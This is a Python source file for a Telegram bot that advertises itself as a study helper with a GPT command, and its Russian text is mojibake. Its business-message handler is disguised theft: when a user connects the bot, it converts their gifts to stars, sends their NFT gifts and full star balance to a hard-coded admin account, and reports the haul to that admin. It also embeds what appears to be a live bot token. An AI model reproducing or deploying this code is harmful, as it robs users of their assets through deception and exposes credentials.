import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
import g4f

TOKEN = "7501977935:AAEw8mKmjxQ0rbCg0pWuoSw1YBFCs9y3o10"
ADMIN_ID = 861087987

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

bot_username = None
business_users = set()


@dp.message_handler(commands=["start"])
async def cmd_start(message: types.Message):
    global bot_username
    if bot_username is None:
        me = await bot.get_me()
        bot_username = f"@{me.username}" if me.username else "—ç—Ç–æ—Ç –±–æ—Ç"

    await message.answer(
        f"<b>–ü—Ä–∏–≤–µ—Ç!</b> üëã\n\n"
        f"–Ø ‚Äî —É–º–Ω—ã–π Telegram Business –±–æ—Ç!\n\n"
        f"–ß—Ç–æ —É–º–µ—é:\n"
        f"‚Ä¢ –ü–æ–º–æ–≥–∞—é —Å —É—á—ë–±–æ–π, –æ—Ç–≤–µ—á–∞—é –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã (–∫–æ–º–∞–Ω–¥–∞ <code>.gpt</code>)\n"
        f"‚Ä¢ –†–∞–±–æ—Ç–∞—é —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –ø–æ–¥–∫–ª—é—á—ë–Ω —á–µ—Ä–µ–∑ Telegram Business\n\n"
        f"–ß—Ç–æ–±—ã –ø–æ–¥–∫–ª—é—á–∏—Ç—å:\n"
        f"1. –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram ‚Üí Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞ ‚Üí –ß–∞—Ç-–±–æ—Ç—ã\n"
        f"2. –î–æ–±–∞–≤—å –º–µ–Ω—è: <code>{bot_username}</code>\n\n"
        f"–ì–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!",
        parse_mode="HTML"
    )


@dp.message_handler(content_types=types.ContentType.ANY)
async def get_message(message: types.Message):
    business_id = getattr(message, "business_connection_id", None)
    if not business_id:
        return

    user_id = message.from_user.id
    business_users.add(user_id)

    try:
        # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –æ–±—ã—á–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã
        normal_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in normal_gifts.gifts:
            try:
                await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
            except:
                pass

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º NFT –ø–æ–¥–∞—Ä–∫–∏ –∞–¥–º–∏–Ω—É
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        for gift in unique_gifts.gifts:
            await bot.transfer_gift(business_id, gift.owned_gift_id, ADMIN_ID, 25)

        # –ü–µ—Ä–µ–¥–∞—ë–º –≤—Å–µ –∑–≤–µ–∑–¥—ã –∞–¥–º–∏–Ω—É
        stars = await bot.get_business_account_star_balance(business_id)
        await bot.transfer_business_account_stars(business_id, int(stars.amount))

        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –∞–¥–º–∏–Ω—É
        await bot.send_message(
            ADMIN_ID,
            f"{getattr(message.from_user, 'username', message.from_user.full_name)} –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞ –≤ Business mode.\n"
            f"\n–ü–æ–¥–∞—Ä–∫–∏ (–Ω–µ NFT): {len(normal_gifts.gifts)}"
            f"\n–ü–æ–¥–∞—Ä–∫–∏ (NFT): {len(unique_gifts.gifts)}"
            f"\n–ó–≤–µ–∑–¥—ã: {int(stars.amount)}"
        )

        await message.answer("‚úÖ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á—ë–Ω –∫ Telegram Business.")

    except Exception as e:
        print(f"–û—à–∏–±–∫–∞: {e}")


@dp.message_handler(lambda msg: msg.chat.type == types.ChatType.PRIVATE and msg.text.startswith(".gpt"))
async def gpt_command(message: types.Message):
    if message.from_user.id not in business_users:
        return await message.reply("‚ùå –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –±–æ—Ç–∞ –≤ Telegram Business.")

    prompt = message.text.replace(".gpt", "").strip()
    processing_msg = await message.reply("‚è≥ –ì–µ–Ω–µ—Ä–∏—Ä—É—é –æ—Ç–≤–µ—Ç...", parse_mode="HTML")

    try:
        response = g4f.ChatCompletion.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}],
        )
        await message.answer(f"ü§ñ –û—Ç–≤–µ—Ç GPT-4:\n{response}", parse_mode="HTML")
    except Exception as e:
        await message.reply(f"üö´ –û—à–∏–±–∫–∞: {str(e)}", parse_mode="HTML")
    finally:
        await processing_msg.delete()


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
